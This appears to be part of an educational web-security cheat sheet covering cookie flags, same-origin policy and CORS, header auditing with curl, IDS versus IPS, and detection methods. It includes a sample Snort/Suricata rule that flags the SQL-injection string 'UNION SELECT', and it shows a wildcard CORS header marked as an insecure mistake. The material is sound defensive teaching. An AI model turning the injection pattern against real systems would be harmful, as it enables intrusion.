SecureCookie only sent over HTTPS (HyperText Transfer Protocol Secure) (never plaintext HTTP)
HttpOnlyJavaScript can't read it — defeats cookie theft via XSS
SameSite=Strict/LaxNot sent on cross-site requests — defeats CSRF
# A well-secured session cookie Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
SAME-ORIGIN & CORS (Cross-Origin Resource Sharing)
The Browser's Core Security Boundary
The Same-Origin Policy is the foundation of web security: a page from siteA.com can't read data from siteB.com. "Origin" = scheme + host + port. This stops a malicious site from reading your bank session. CORS (Cross-Origin Resource Sharing) is the controlled way to relax this — a server explicitly opts in to allow specific other origins to call it. CORS errors confuse beginners, but they're the browser protecting the user, not a bug.
# Server allows a specific origin to call its API Access-Control-Allow-Origin: https://app.example.com Access-Control-Allow-Methods: GET, POST Access-Control-Allow-Credentials: true # Common beginner mistake (insecure!) — allow everything: Access-Control-Allow-Origin: * # OK for public APIs, dangerous with credentials
TESTING HEADERS
Quickly Audit a Site's Headers
# See response headers with curl curl -I https://example.com # HEAD request, headers only curl -sD - https://example.com -o /dev/null # dump headers # Online graders: securityheaders.com, Mozilla Observatory # Browser DevTools → Network tab → click request → Headers
🚨 IDS/IPS & Detection — Catching Attacks on the Wire SEC • Essential ▶
IDS VS IPS (Intrusion Prevention System)
Detect vs Prevent
An IDS (Intrusion Detection System) watches traffic and alerts on suspicious activity — it's a smoke detector. An IPS (Intrusion Prevention System) sits inline and can block the traffic — a sprinkler system. The tradeoff: an IPS can stop attacks in real time, but a false positive can block legitimate traffic.
AspectIDSIPS
PlacementOut-of-band (sees a copy of traffic)Inline (traffic flows through it)
ActionAlerts onlyAlerts AND blocks/drops
Risk of false positiveAnnoying alertBlocks real traffic (outage)
ToolsSnort, Suricata, ZeekSnort/Suricata (inline mode)
DETECTION METHODS
Signature vs Anomaly vs Behavior
MethodHow It WorksStrength / Weakness
Signature-basedMatch known attack patterns/rules+ Accurate for known threats; − misses novel attacks
Anomaly-basedFlag deviations from a learned baseline+ Catches unknowns; − more false positives
Behavior-basedDetect malicious sequences of actions+ Catches TTPs (Tactics, Techniques, and Procedures); − needs tuning
# A simple Suricata/Snort rule (signature) alert tcp any any -> any 80 (msg:"Possible SQLi"; content:"UNION SELECT"; nocase; sid:1000001;) # Triggers an alert when "UNION SELECT" appears in HTTP traffic
FALSE POSITIVES & TUNING
The Analyst's Daily Reality
The hardest part of detection isn't getting alerts — it's getting useful alerts. Too many false positives cause "alert fatigue," where analysts start ignoring everything (and miss the real one).
